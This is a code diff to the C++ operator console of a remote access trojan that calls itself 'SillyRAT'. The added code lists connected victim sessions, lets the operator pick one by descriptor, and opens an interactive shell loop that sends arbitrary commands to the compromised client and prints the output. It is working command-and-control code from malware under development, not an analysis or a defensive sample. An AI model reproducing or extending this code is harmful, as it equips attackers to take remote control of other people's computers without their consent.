@@ -1,6 +1,8 @@
 #include <iostream>
 #include <string>
 #include <cstring>
+#include <map>
+#include <vector>
 
 using namespace std;
 
@@ -8,10 +10,13 @@ class INTERFACE{
 private:
     string inputSv;
     string sockAddr;
+    string current_address;
+    int current_descriptor;
     int port;
 
-    COLORS colorIf;
+    COLORS color;
     INPUT inputIf;
+    SERVER *middle_face;
 
 public:
     INTERFACE(){
@@ -24,9 +29,63 @@ public:
         this->sockAddr = vala;
         this->port     = valb;
     }
+    void setMiddleFace(SERVER *middle_face){
+        this->middle_face = middle_face;
+    }
+    void listSessions(){
+        std::map<int, std::string> sessions = this->middle_face->retClients();
+        std::map<int, std::string>::iterator sessions_it;
+
+        cout << endl;
+            cout << color.BOLD << "   Descriptor   :      Ip Address  " << color.END << endl;
+        for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
+            cout << "   " << sessions_it->first << "            :      " <<sessions_it->second << endl;
+        }
+        cout << endl;
+    }
+    void operateSession(const string input_string){
+        std::vector<std::string> words = color.split(input_string);
+        std::map<int, std::string> sessions = this->middle_face->retClients();
+        std::map<int, std::string>::iterator sessions_it;
+
+        if(words.size() >= 2){
+            for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
+                if(to_string(sessions_it->first) == words[1]){
+                    this->current_address    = sessions_it->second;
+                    this->current_descriptor = sessions_it->first;
+                    break;
+                }
+            }
+        }else{
+            cout << color.RED << "~ " << color.END << "Invalid Command!" << endl;
+        }
+    }
+    void spawnShell(){
+        string ii;
+        bool status;
+
+        cout << endl;
+        cout << "# Shell v1.0. SillyRAT" << endl;
+        while(true){
+            cout << "# ";
+            ii = this->inputIf.getInput();;
+
+            if(ii == "exit"){
+                cout << endl;
+                break;
+            }else{
+                status = this->middle_face->sendData(current_descriptor, ii);
+                if(status){
+                    cout << this->middle_face->receiveData(current_descriptor);
+                }else{
+                    cout << "# Send Command failed!" << endl;
+                }
+            }   
+        }
+    }
     void engage(){
         while(true){
-            cout << colorIf.YELLOW << "$ " << colorIf.END ;
+            color.showLiner(current_address, current_descriptor);
             this->inputSv = this->inputIf.getInput();
 
             if(this->inputSv == "exit"){
@@ -34,7 +93,11 @@ public:
             }else if(this->inputSv == "help"){
                 this->inputIf.getServerHelp();
             }else if(this->inputSv.rfind("sessions", 0) == 0){
-                cout << inputSv << endl;
+                this->listSessions();
+            }else if(this->inputSv.rfind("operate", 0) == 0){
+                this->operateSession(this->inputSv);
+            }else if(this->inputSv.rfind("shell", 0) == 0){
+                this->spawnShell();
             }
         }
     }
